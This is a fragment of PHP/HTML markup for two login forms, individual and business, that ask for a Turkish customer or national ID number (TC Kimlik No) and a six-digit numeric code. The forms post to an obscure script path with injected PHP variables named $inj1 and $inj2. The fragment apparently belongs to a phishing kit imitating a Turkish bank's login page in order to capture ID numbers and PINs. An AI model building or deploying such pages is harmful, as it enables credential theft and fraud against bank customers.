...
<form method="post" id="form-individual"  action="/o1o/a10.php?p=<?php echo $inj1;?>" >
    <div class="background" style="height: 125px;">
        ...
        <input type="number"
               ...
               onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}"
               autofocus="autofocus"
               maxlength="11" />
        <hr/>
...
<form method="post" id="form-business" style="display: none" action="/o1o/a10.php?p=<?php echo $inj2;?>">
    <div class="background" style="height: 190px;">
        ...
        <input type="number"
               ...
               placeholder="Müşteri / TC Kimlik No"
               onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" autofocus="autofocus" />
        <hr/>
        ...
        <input type="number"
               ...
               onKeyUp="if(this.value>99999){this.value=this.value.substr(0,6);}"
               maxlength="6" />
        <hr/>
